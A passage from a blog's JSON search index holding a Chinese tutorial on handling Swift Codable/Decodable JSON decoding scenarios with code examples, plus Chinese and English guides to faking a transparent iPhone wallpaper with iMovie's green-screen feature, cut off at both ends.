iframe due to browser security issues; thus, it only displays the questionnaire information and requires clicking the fill-out button to open a new window for input.The only solution is to remove the file upload question, allowing users to fill it out directly on the page.Anchor Links Cannot Be Entered in Button Component URLsFor example: #lifesection, which I want to use at the top of the page for a directory index or at the bottom for a GoTop button.I checked with the official community, and currently, it’s not possible. The button links can only 1. open external links in a new window or 2. specify internal pages, so I ended up using subpages to split the directory.Further Reading [Productivity Tools] Abandoning Chrome for the Embrace of Sidekick BrowserIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 20,285 Total Views Last Statistics Date: 2025-08-15 | 20,157 Views on Medium." }, { "title": "現實使用 Codable 上遇到的 Decode 問題場景總匯", "url": "/posts/zrealm-dev/%E7%8F%BE%E5%AF%A6%E4%BD%BF%E7%94%A8-codable-%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84-decode-%E5%95%8F%E9%A1%8C%E5%A0%B4%E6%99%AF%E7%B8%BD%E5%8C%AF-1aa2f8445642/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, codable, json, decode", "date": "2020-06-14 00:33:58 +0800", "snippet": "現實使用 Codable 上遇到的 Decode 問題場景總匯(上)從基礎到進階，深入使用 Decodable 滿足所有可能會遇到的問題場景Photo by Gustas Brazaitis前言因應後端 API 升級需要調整 API 處理架構，近期趁這個機會一併將原本使用 Objective-C 撰寫的網路處理架構更新成 Swift；因語言不同，也不在適合使用原本的 Restkit 幫我們處...", "content": "現實使用 Codable 上遇到的 Decode 問題場景總匯(上)從基礎到進階，深入使用 Decodable 滿足所有可能會遇到的問題場景Photo by Gustas Brazaitis前言因應後端 API 升級需要調整 API 處理架構，近期趁這個機會一併將原本使用 Objective-C 撰寫的網路處理架構更新成 Swift；因語言不同，也不在適合使用原本的 Restkit 幫我們處理網路層應用，但不得不說 Restkit 的功能包山包海非常強大，在專案中也用得活靈活現，基本沒有太大的問題；但相對的非常笨重、幾乎已不再維護、純 Objective-C；未來勢必也要更換的。Restkit 幾乎幫我們處理完所有網路請求相關會需要到的功能，從基本的網路處理、API 呼叫、網路處理，到 Response 處理 JSON String to Object 甚至是 Object 存入 Core Data 它都能一起處理實打實的一個 Framework 打十個。隨著時代的演進，目前的 Framework 已不在主打一個包全部，更多的是靈活、輕巧、組合，增加更多彈性創造更多變化；因此再替換成 Swift 語言的同時，我們選擇使用 Moya 作為網路處理部分的套件，其他我們需要的功能再選擇其他方式進行組合。正題關於 JSON String to Object Mapping 部分，我們使用 Swift 自帶的 Codable (Decodable) 協議 &amp; JSONDecoder 進行處理；並拆分 Entity/Model 加強權責區分、操作及閱讀性、另外 Code Base 混 Objective-C 和 Swift 也要考量進去。 ＊ Encodable 的部份省略、範例均只展示實作 Decodable，大同小異，可以 Decode 基本也能 Encode。開始假設我們初始的 API Response JSON String 如下:{ \"id\": 123456, \"comment\": \"是告五人，不是五告人!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" }}由上範例我們可以拆成：User/Song/Comment 三個 Entity &amp; Model，讓我們組合能複用，為方便展示先將 Entity/Model 寫在同個檔案。User:// Entity:struct UserEntity: Decodable { var id: Int var name: String var email: String}//Model:class UserModel: NSObject { init(_ entity: UserEntity) { self.id = entity.id self.name = entity.name self.email = entity.email } var id: Int var name: String var email: String}Song:// Entity:struct SongEntity: Decodable { var id: Int var name: String}//Model:class SongModel: NSObject { init(_ entity: SongEntity) { self.id = entity.id self.name = entity.name } var id: Int var name: String}Comment:// Entity:struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } var id: Int var comment: String var targetObject: SongEntity var commenter: UserEntity}//Model:class CommentModel: NSObject { init(_ entity: CommentEntity) { self.id = entity.id self.comment = entity.comment self.targetObject = SongModel(entity.targetObject) self.commenter = UserModel(entity.commenter) } var id: Int var comment: String var targetObject: SongModel var commenter: UserModel}JSONDecoder:let jsonString = \"{ \\\"id\\\": 123456, \\\"comment\\\": \\\"是告五人，不是五告人!\\\", \\\"target_object\\\": { \\\"type\\\": \\\"song\\\", \\\"id\\\": 99, \\\"name\\\": \\\"披星戴月的想你\\\" }, \\\"commenter\\\": { \\\"type\\\": \\\"user\\\", \\\"id\\\": 1, \\\"name\\\": \\\"zhgchgli\\\", \\\"email\\\": \\\"zhgchgli@gmail.com\\\" } }\"let jsonDecoder = JSONDecoder()do { let result = try jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!)} catch { print(error)}CodingKeys Enum?當我們的 JSON String Key Name 與 Entity Object Property Name 不相匹配時可以在內部加一個 CodingKeys 枚舉進行對應，畢竟後端資料源的 Naming Convention 不是我們可以控制的。case PropertyKeyName = \"後端欄位名稱\"case PropertyKeyName //不指定則預設使用 PropertyKeyName 為後端欄位名稱一旦加入 CodingKeys 枚舉，則必須列舉出所有非 Optional 的欄位，不能只列舉想要客製的 Key。另外一種方式是設定 JSONDecoder 的 keyDecodingStrategy，若 Response 資料欄位與 Property Name 僅為 snake_case &lt;-&gt; camelCase 區別，可直接設定 .keyDecodingStrategy = .convertFromSnakeCase 就能自動匹配 Mapping。let jsonDecoder = JSONDecoder()jsonDecoder.keyDecodingStrategy = .convertFromSnakeCasetry jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!)回傳資料是陣列時：struct SongListEntity: Decodable { var songs:[SongEntity]}為 String 加上約束：struct SongEntity: Decodable { var id: Int var name: String var type: SongType enum SongType { case rock case pop case country }}適用於有限範圍的字串類型，寫成 Enum 方便我們傳遞、使用；若出現為列舉的值會 Decode 失敗！善用泛型包裹固定結構：假設多筆回傳的 JSON String 固定格式為：{ \"count\": 10, \"offset\": 0, \"limit\": 0, \"results\": [ { \"type\": \"song\", \"id\": 1, \"name\": \"1\" } ]}即可用泛型方式包裹起來：struct PageEntity&lt;E: Decodable&gt;: Decodable { var count: Int var offset: Int var limit: Int var results: [E]}使用： PageEntity&lt;Song&gt;.selfDate/Timestamp 自動 Decode：設定 JSONDecoder 的 dateDecodingStrategy .secondsSince1970/.millisecondsSince1970 : unix timestamp .deferredToDate : 蘋果的 timestamp，罕用，不同於 unix timestamp，這是從 2001/01/01 起算 .iso8601 : ISO 8601 日期格式 .formatted(DateFormatter) : 依照傳入的 DateFormatter Decode Date .custom : 自訂 Date Decode 邏輯.cutstom 範例：假設 API 會回傳 YYYY/MM/DD 和 ISO 8601 兩種格式，兩中都要能 Decode：var dateFormatter = DateFormatter()var iso8601DateFormatter = ISO8601DateFormatter()let decoder: JSONDecoder = JSONDecoder()decoder.dateDecodingStrategy = .custom({ (decoder) -&gt; Date in let container = try decoder.singleValueContainer() let dateString = try container.decode(String.self) //ISO8601: if let date = iso8601DateFormatter.date(from: dateString) { return date } //YYYY-MM-DD: dateFormatter.dateFormat = \"yyyy-MM-dd\" if let date = dateFormatter.date(from: dateString) { return date } throw DecodingError.dataCorruptedError(in: container, debugDescription: \"Cannot decode date string \\(dateString)\")})let result = try jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!) ＊DateFormatter 在 init 時非常消耗性能，盡可能重複使用。基本 Decode 常識： Decodable Protocol 內的的欄位類型(struct/class/enum)，都須實作 Decodable Protocol；亦或是在 init decoder 時賦予值 欄位類型不相符時會 Decode 失敗 Decodable Object 中欄位設為 Optional 的話則為可有可無，有給就 Decode Optional 欄位可接受: JSON String 無欄位、有給但給 nil 空白、0 不等於 nil，nil 是 nil；弱型別的後端 API 需注意！ 預設 Decodable Object 中有列舉且非 Optional 的欄位，若 JSON String 沒給會 Decode 失敗（後續會說明如何處理） 預設 遇到 Decode 失敗會直接中斷跳出，無法單純跳過有誤的資料（後續會說明如何處理）左：”” / 右：nil進階使用到此為止基本的使用已經完成了，但現實世界不會那麼簡單；以下列舉幾個進階會遇到的場景並提出適用 Codable 的解決方案，從這邊開始我們就無法靠原始的 Decode 幫我們補 Mapping 了，要自行實作 init(from decoder: Decoder) 客製 Decode 操作。 ＊這邊暫時先只展示 Entity 的部分，Model 還用不到。init(from decoder: Decoder)init decoder，必須賦予所有非 Optional 的欄位初始值（就是 init 啦！）。自訂 Decode 操作時，我們需要從 decoder 中取得 container 出來操作取值， container 有三種取得內容的類型。第一種 container(keyedBy: CodingKeys.self) 依照 CodingKeys 操作：struct SongEntity: Decodable { var id: Int var name: String enum CodingKeys: String, CodingKey { case id case name } init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) //參數 1 接受支援：實作 Decodable 的類別 //參數 2 CodingKeys self.name = try container.decode(String.self, forKey: .name) }}第二種 singleValueContainer 將整包取出操作（單值）：enum HandsomeLevel: Decodable { case handsome(String) case normal(String) init(from decoder: Decoder) throws { let container = try decoder.singleValueContainer() let name = try container.decode(String.self) if name == \"zhgchgli\" { self = .handsome(name) } else { self = .normal(name) } }}struct UserEntity: Decodable { var id: Int var name: HandsomeLevel var email: String enum CodingKeys: String, CodingKey { case id case name case email }}適用於 Associated Value Enum 欄位類型，例如 name 還自帶帥氣程度！第三種 unkeyedContainer 將整包視為一包陣列：struct ListEntity: Decodable { var items:[Decodable] init(from decoder: Decoder) throws { var unkeyedContainer = try decoder.unkeyedContainer() self.items = [] while !unkeyedContainer.isAtEnd { //unkeyedContainer 內部指針會自動在 decode 操作後指向下一個對象 //直到指向結尾即代表遍歷結束 if let id = try? unkeyedContainer.decode(Int.self) { items.append(id) } else if let name = try? unkeyedContainer.decode(String.self) { items.append(name) } } }}let jsonString = \"[\\\"test\\\",1234,5566]\"let jsonDecoder = JSONDecoder()let result = try jsonDecoder.decode(ListEntity.self, from: jsonString.data(using: .utf8)!)print(result)適用不固定類型的陣列欄位。Container 之下我們還能使用 nestedContainer / nestedUnkeyedContainer 對特定欄位操作： ＊將資料欄位扁平化（類似 flatMap）struct ListEntity: Decodable { enum CodingKeys: String, CodingKey { case items case date case name case target } enum PredictKey: String, CodingKey { case type } var date: Date var name: String var items: [Decodable] var target: Decodable init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.date = try container.decode(Date.self, forKey: .date) self.name = try container.decode(String.self, forKey: .name) let nestedContainer = try container.nestedContainer(keyedBy: PredictKey.self, forKey: .target) let type = try nestedContainer.decode(String.self, forKey: .type) if type == \"song\" { self.target = try container.decode(SongEntity.self, forKey: .target) } else { self.target = try container.decode(UserEntity.self, forKey: .target) } var unkeyedContainer = try container.nestedUnkeyedContainer(forKey: .items) self.items = [] while !unkeyedContainer.isAtEnd { if let song = try? unkeyedContainer.decode(SongEntity.self) { items.append(song) } else if let user = try? unkeyedContainer.decode(UserEntity.self) { items.append(user) } } }}存取、Decode 不同階層的物件，範例展示 target/items 使用 nestedContainer flat 出 type 再依照 type 去做對應的 decode。Decode &amp; DecodeIfPresent DecodeIfPresent： Response 有給資料欄位時才會進行 Decode（Codable Property 設 Optional 時） Decode：進行 Decode 操作，若 Response 無給資料欄位會拋出 Error ＊以上只是簡單介紹一下 init decoder、container 有哪些方法、功能，看不懂也沒關係，我們直接進入現實場景；在範例中感受組合起來的操作方式。現實場景回到原本的範例 JSON String。場景1. 假設今天對誰留言可能是對歌曲或對人留言， targetObject 欄位可能的對象是 User 或 Song ? 那該如何處理?{ \"results\": [ { \"id\": 123456, \"comment\": \"是告五人，不是五告人!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" } }, { \"id\": 55, \"comment\": \"66666!\", \"target_object\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\" }, \"commenter\": { \"type\": \"user\", \"id\": 2, \"name\": \"aaaa\", \"email\": \"aaaa@gmail.com\" } } ]}方式 a.使用 Enum 做為容器 Decode。struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } var id: Int var comment: String var targetObject: TargetObject var commenter: UserEntity enum TargetObject: Decodable { case song(SongEntity) case user(UserEntity) enum PredictKey: String, CodingKey { case type } enum TargetObjectType: String, Decodable { case song case user } init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: PredictKey.self) let singleValueContainer = try decoder.singleValueContainer() let targetObjectType = try container.decode(TargetObjectType.self, forKey: .type) switch targetObjectType { case .song: let song = try singleValueContainer.decode(SongEntity.self) self = .song(song) case .user: let user = try singleValueContainer.decode(UserEntity.self) self = .user(user) } } }}我們將 targetObject 的屬性換成 Associated Value Enum，在 Decode 時才決定 Enum 內要放什麼內容。核心實踐是建立一個符合 Decodable 的 Enum 做為容器，decode 時先取關鍵欄位出來判斷(範例 JSON String 中的 type 欄位)，若為 Song 則使用 singleValueContainer 將整包解成 SongEntity ，若為 User 亦然。要使用時再從 Enum 中取出：//if case letif case let CommentEntity.TargetObject.user(user) = result.targetObject { print(user)} else if case let CommentEntity.TargetObject.song(song) = result.targetObject { print(song)}//switch case letswitch result.targetObject {case .song(let song): print(song)case .user(let user): print(user)}方式 b.改宣告欄位屬性為 Base Class。struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } enum PredictKey: String, CodingKey { case type } var id: Int var comment: String var targetObject: Decodable var commenter: UserEntity init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) self.comment = try container.decode(String.self, forKey: .comment) self.commenter = try container.decode(UserEntity.self, forKey: .commenter) // let targetObjectContainer = try container.nestedContainer(keyedBy: PredictKey.self, forKey: .targetObject) let targetObjectType = try targetObjectContainer.decode(String.self, forKey: .type) if targetObjectType == \"user\" { self.targetObject = try container.decode(UserEntity.self, forKey: .targetObject) } else { self.targetObject = try container.decode(SongEntity.self, forKey: .targetObject) } }}原理差不多，但這邊先使用 nestedContainer 衝進去 targetObject 拿 type 出來判斷，再決定 targetObject 要解析成什麼類型。要使用時再 Cast ：if let song = result.targetObject as? Song { print(song)} else if let user = result.targetObject as? User { print(user)}場景2. 假設資料陣列欄位放多種類型的資料該如何 Decode?{ \"results\": [ { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" } ]}結合上述提到的 nestedUnkeyedContainer +場景1. 的解決方案即可；這邊也能改用 場景1. 的 a.解決方案 ，用 Associated Value Enum 存取值。場景3. JSON String 欄位有給值時才 Decode[ { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, { \"type\": \"song\", \"id\": 11 }]使用 decodeIfPresent 進行 decode。場景4. 陣列資料略過 Decode 失敗錯誤的資料{ \"results\": [ { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, { \"error\": \"errro\" }, { \"type\": \"song\", \"id\": 19, \"name\": \"帶我去找夜生活\" } ]}如前述，Decodable 預設是所有資料剖析都正確才能 Mapping 輸出；有時會遇到後端給的資料不穩定，給一長串 Array 但就有幾筆資料缺了欄位或欄位類型不符導致 Decode 失敗；造成整包全部失敗，直接 nil。struct ResultsEntity: Decodable { enum CodingKeys: String, CodingKey { case results } var results: [SongEntity] init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) var nestedUnkeyedContainer = try container.nestedUnkeyedContainer(forKey: .results) self.results = [] while !nestedUnkeyedContainer.isAtEnd { if let song = try? nestedUnkeyedContainer.decode(SongEntity.self) { self.results.append(song) } else { let _ = try nestedUnkeyedContainer.decode(EmptyEntity.self) } } }}struct EmptyEntity: Decodable { }struct SongEntity: Decodable { var type: String var id: Int var name: String}let jsonString = \"{ \\\"results\\\": [ { \\\"type\\\": \\\"song\\\", \\\"id\\\": 99, \\\"name\\\": \\\"披星戴月的想你\\\" }, { \\\"error\\\": \\\"errro\\\" }, { \\\"type\\\": \\\"song\\\", \\\"id\\\": 19, \\\"name\\\": \\\"帶我去找夜生活\\\" } ] }\"let jsonDecoder = JSONDecoder()let result = try jsonDecoder.decode(ResultsEntity.self, from: jsonString.data(using: .utf8)!)print(result)解決方式也類似 場景2.的解決方案 ； nestedUnkeyedContainer 遍歷每個內容，並進行 try? Decode，如果 Decode 失敗則使用 Empty Decode 讓 nestedUnkeyedContainer 的內部指針繼續執行。 ＊此方法有點 workaround，因我們無法對 nestedUnkeyedContainer 命令跳過，且 nestedUnkeyedContainer 必須有成功 decode 才會繼續執行；所以才這樣做，看 swift 社群有人提增加 moveNext( ) ，但目前版本尚未實作。場景5. 有的欄位是我程式內部要使用的，而非要 Decode方式a. Entity/Model這邊就要提一開始說的，我們拆分 Entity/Model 的功用了；Entity 單純負責 JSON String to Entity(Decodable) Mapping；Model initWith Entity，實際程式傳遞、操作、商業邏輯都是使用 Model。struct SongEntity: Decodable { var type: String var id: Int var name: String}class SongModel: NSObject { init(_ entity: SongEntity) { self.type = entity.type self.id = entity.id self.name = entity.name } var type: String var id: Int var name: String var isSave:Bool = false //business logic}拆分 Entity/Model 的好處： 權責分明，Entity: JSON String to Decodable, Model: business logic 一目瞭然 mapping 了哪些欄位看 Entity 就知道 避免欄位一多全喇在一起 Objective-C 也可用 （因 Model 只是 NSObject、struct/Decodable Objective-C 不可見） 內部要使用的商業邏輯、欄位放在 Model 即可方式b. init 處理列出 CodingKeys 並排除內部使用的欄位，init 時給預設值或欄位有給預設值或設為 Optional，但都不是好方法，只是可以 run 而已。[2020/06/26 更新] — 下篇 場景6.API Response 使用 0/1 代表 Bool，該如何 Decode? 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)[2020/06/26 更新] — 下篇 場景7.不想要每每都要重寫 init decoder 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)[2020/06/26 更新] — 下篇 場景8.合理的處理 Response Null 欄位資料 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)綜合場景範例綜合以上基本使用及進階使用的完整範例：{ \"count\": 5, \"offset\": 0, \"limit\": 10, \"results\": [ { \"id\": 123456, \"comment\": \"是告五人，不是五告人!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\", \"create_date\": \"2020-06-13T15:21:42+0800\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\", \"birthday\": \"1994/07/18\" } }, { \"error\": \"not found\" }, { \"error\": \"not found\" }, { \"id\": 2, \"comment\": \"哈哈，我也是!\", \"target_object\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\", \"birthday\": \"1994/07/18\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"路人甲\", \"email\": \"man@gmail.com\", \"birthday\": \"2000/01/12\" } } ]}Output:zhgchgli:是告五人，不是五告人!完整範例演示如上！(下)篇＆其他場景已更新： 現實使用 Codable 上遇到的 Decode 問題場景總匯(下)總結選擇使用 Codable 的好處，第一當然是因為原生，不用怕後續無人維護、還有寫起來漂亮；但相對的限制較嚴格、比較不能靈活解 JSON String，不然就是要如本文做更多的事去完成、還有效能其實不比使用其他 Mapping 套件優（Decodable 依然使用Objective 時代的 NSJSONSerialization 進行解析），但我想在後續的更新中或許蘋果會對此進行優化，那時我們也不必更動程式。文中場景、範例或許有些很極端，但有時候遇到了也沒辦法；當然希望一般情況下單純的 Codable 就能滿足我們的需求；但有了以上招式之後應該沒有打不倒的問題了！ 感謝 ＠saiday 大大技術支援。延伸閱讀 深入 Decodable — — 写一个超越原生的 JSON 解析器 滿滿的內容，深入了解 Decoder/JSONDecoder。 不同角度看问题 — 从 Codable 到 Swift 元编程 Why Model Objects Shouldn’t Implement Swift’s Decodable or Encodable Protocols有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 3,719 Total Views Last Statistics Date: 2025-08-15 | 3,494 Views on Medium." }, { "title": "使用 iPhone 簡單製作「偽」透視透明手機桌布", "url": "/posts/zrealm-life/%E4%BD%BF%E7%94%A8-iphone-%E7%B0%A1%E5%96%AE%E8%A3%BD%E4%BD%9C-%E5%81%BD-%E9%80%8F%E8%A6%96%E9%80%8F%E6%98%8E%E6%89%8B%E6%A9%9F%E6%A1%8C%E5%B8%83-2e4429f410d6/", "categories": "ZRealm Life.", "tags": "iphone, 生活, imovie, chroma-key, wallpaper", "date": "2020-05-10 15:37:42 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 iPhone 簡單製作「偽」透視透明手機桌布應用 iMovie 綠幕摳圖功能合成影片反正我很閒白天工作，被資本家剝削肉體；晚上又被大眾娛樂剝削心靈，依然做不到白天工作、晚上讀書、假日批判的境界 ！最近在無腦放鬆的時候， ...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 iPhone 簡單製作「偽」透視透明手機桌布應用 iMovie 綠幕摳圖功能合成影片反正我很閒白天工作，被資本家剝削肉體；晚上又被大眾娛樂剝削心靈，依然做不到白天工作、晚上讀書、假日批判的境界 ！最近在無腦放鬆的時候， 滑到一個很常見的桌布 APP 廣告，廣告中展示了一個透視透明的桌布很吸睛 ；但可想而知是不可能的，就算後置相機實時取景角度也不可能這麼吻合！【Youtuber內幕】美劇、影集注意！揭發大眾媒體不會告訴你的荼毒真相！白天工作 晚上讀書 假日批判！還原欺騙秘辛｜反正我很閒完成效果我們要做個有腦的青年！雖然知道是特效，本來以為會非常複雜；沒想到 iPhone 內建的 iMovie APP 簡單點一點就能製作了。只需要： 一支 iPhone（因為要直接使用 iMovie）、入鏡用手機 一支負責拍攝的手機 or 相機 手機架 or 水瓶…或任何可以支撐手機的物品 iMovie APP （免費下載） 綠色底圖（綠幕）可直接下載此圖或從 網路取得這 5 樣東西就能製作出透視效果！具體流程： 架好負責拍攝的手機 直接拍攝一段乾淨的影片（無手機入鏡） 將要入鏡的手機底圖設為綠色底圖 再拍攝一段入鏡手機的操作影片 開啟 iMovie APP 合成 完成開始1. 將手機架設好、抓好拍攝角度我使用兩個鰻魚罐頭跟一瓶礦泉水當作手機架（如果有立式手機架當然更好！）使用手機架拍攝的目的是由於我們希望兩部影片的角度都是統一的，否則會出現畫面位移的情況，看起來效果就沒那麼好；手持的話勢必不可能兩部影片 100% 視角位置都ㄧ樣。2.拍攝一段乾淨的影片影片想要多長，乾淨的影片就拍攝多長。3.將入鏡手機的桌布設為綠色底圖「設定」-&gt; 「背景圖片」-&gt;「選擇下載下來的綠色底圖」-&gt;「同時設定」完成圖4.拍攝一段入鏡手機的操作影片影片時長同 2. 乾淨影片；超過也沒關係，之後再裁剪。5.開啟 iMovie APP 建立專案「+」-&gt;「影片」-&gt; 選擇「 乾淨的影片 」-&gt;「製作影片」插入乾淨的影片到專案中。6. 將播放位置移到最前若沒有將乾淨的影片播放位置移至影片起始點，否則在後續插入綠幕影片時會出現「 將播放磁頭從結尾處移開來加入覆疊 」。7.插入入鏡手機操作影片點擊右上角「+」-&gt;「影片」-&gt;「全部」選擇「入鏡的操作影片」-&gt;「…」-&gt;「綠色/藍色螢幕」（俗稱：摳圖）點選上方「入鏡操作影片」-&gt;「滾動到有綠色桌布的影格」-&gt; 點擊「綠色區域」-&gt; 完成透視透明8.合成完成！匯出影片確認兩段影片結束時間一致，點擊左上角「完成」-&gt; 下方「分享」 -&gt; 選擇輸出目標 -&gt; 輸出完成9. 完成Tips 可先隱藏有綠色圖標的 APP，如 Line、訊息…. 防止穿幫（因摳圖依據是綠色） 或可使用藍色底圖，改摳藍色；或其他顏色也可（但綠/藍效果最佳） 同原理還有更多玩法，等你發掘！結語just for fun…沒想到 iMovie 功能這麼強大！延伸閱讀 [生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 6,989 Total Views Last Statistics Date: 2025-08-15 | 6,960 Views on Medium." }, { "title": "Easily Create a 'Pseudo' Transparent Phone Wallpaper Using iPhone", "url": "/posts/zrealm-life/en/easily-create-a-pseudo-transparent-phone-wallpaper-using-iphone-2e4429f410d6/", "categories": "ZRealm Life.", "tags": "iphone, life, imovie, chroma-key, wallpaper", "date": "2020-05-10 15:37:42 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Easily Create a ‘Pseudo’ Transparent Phone Wallpaper Using iPhoneUsing iMovie’s gree...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Easily Create a ‘Pseudo’ Transparent Phone Wallpaper Using iPhoneUsing iMovie’s green screen feature to create videosJust Because I’m BoredDuring the day, I work, getting exploited by capitalists; at night, I’m exploited by mass entertainment, yet I still can’t reach the level of working during the day, studying at night, and critiquing on weekends!Recently, while mindlessly relaxing, I came across a common wallpaper app advertisement showcasing an eye-catching transparent wallpaper; but it’s obvious that such a thing is impossible. Even with the rear camera capturing real-time angles, it wouldn’t align perfectly! ![[Inside the Youtuber] Attention TV Shows and Series! Exposing the toxic truths that mainstream media won’t tell you! Work during the day, study at night, critique on weekends! Revealing the secrets of deception Just Because I’m Bored](https://www.youtube.com/watch?v=0_dVHQBx-4k){:target=”_blank”}](/assets/2e4429f410d6/1*ld3iXPtwH_pqTLADZcnSNg.webp){: lqip=”data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjczIiBoZWlnaHQ9IjY0MCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==” } 【Inside the Youtuber】 Attention TV Shows and Series! Exposing the toxic truths that mainstream media won’t tell you! Work during the day, study at night, critique on weekends! Revealing the secrets of deception | Just Because I’m BoredFinal ResultLet’s Be Smart Young People!Although I know it’s a special effect, I initially thought it would be very complicated; I didn’t expect that the built-in iMovie app on the iPhone could create it with just a few taps.You will need: An iPhone (to use iMovie directly) and a phone for the shot A second phone or camera for filming A phone stand or a water bottle… or any object that can support the phone iMovie APP (free download) A green background image (green screen)You can download this image directly or obtain it from the internetWith these 5 items, you can create a transparent effect!Steps: Set up the phone for filming Record a clean video (without the phone in the shot) Set the wallpaper of the phone to the green background Record a video of the phone in action Open the iMovie app to combine DoneGetting Started1. Set up the phone and get the filming angle rightI used two eel cans and a bottle of mineral water as a phone stand (a proper phone stand would be even better!)The purpose of using a phone stand is to ensure that both videos have the same angle; otherwise, there will be a misalignment in the footage, making the effect less convincing. If you hold the phone, it’s impossible to keep the angles identical in both videos.2. Record a clean videoRecord the clean video for as long as you want it to be.3. Set the wallpaper of the phone to the green backgroundSettings -&gt; Wallpaper -&gt; Choose the downloaded green background -&gt; Set bothFinal image4. Record a video of the phone in actionThe video length should match the clean video; it’s okay if it’s longer, you can trim it later.5. Open the iMovie app and create a projectClick ‘+’ -&gt; ‘Video’ -&gt; Select ‘Clean Video’ -&gt; ‘Create Movie’Insert the clean video into the project.6. Move the playhead to the frontIf you don’t move the playhead to the start of the clean video, you will encounter a message saying “Move the playhead away from the end to add an overlay” when you insert the green screen video.7. Insert the phone action videoClick the top right ‘+’ -&gt; ‘Video’ -&gt; ‘All’Select ‘Phone Action Video’ -&gt; ‘…’ -&gt; ‘Green/Blue Screen’ (commonly known as Chroma Key)Select the ‘Phone Action Video’ above -&gt; Scroll to the frame with the green background -&gt; Click the ‘Green Area’ -&gt; Complete the transparent effect8. Composition complete! Export the videoEnsure both videos have the same end time, click the top left ‘Done’ -&gt; Bottom ‘Share’ -&gt; Choose export target -&gt; Export complete9. DoneTips You may want to hide apps with green icons, like Line or Messages, to prevent them from showing up (since the chroma key relies on green). Alternatively, you can use a blue background and chroma key blue; other colors can work too (but green/blue gives the best results). There are many more creative possibilities with the same principle waiting for you to discover!ConclusionJust for fun… I didn’t expect iMovie to be this powerful!Further Reading [Productivity Tool] Abandon Chrome and Embrace the Sidekick BrowserIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 6,989 Total Views Last Statistics Date: 2025-08-15 | 6,960 Views on Medium." }, { "title": "打造舒適的 WFH 智慧居家環境，控制家電盡在指尖", "url": "/posts/zrealm-life/%E6%89%93%E9%80%A0%E8%88%92%E9%81%A9%E7%9A%84-wfh-%E6%99%BA%E6%85%A7%E5%B1%85%E5%AE%B6%E7%92%B0%E5%A2%83-%E6%8E%A7%E5%88%B6%E5%AE%B6%E9%9B%BB%E7%9B%A1%E5%9C%A8%E6%8C%87%E5%B0%96-99db2a1fbfe5/", "categories": "ZRealm Life.", "tags": "homekit, iphone, homebridge, 米家, 生活", "date": "2020-04-20 22:37:49 +0800", "snippet": "打造舒適的 WFH 智慧居家環境，控制家電盡在指尖示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKitphoto by picjumbo.com關於因為疫情的關係，在家時間變長了；尤其是要 Work From Home 的話，家裡的電器設備最好都能在 APP 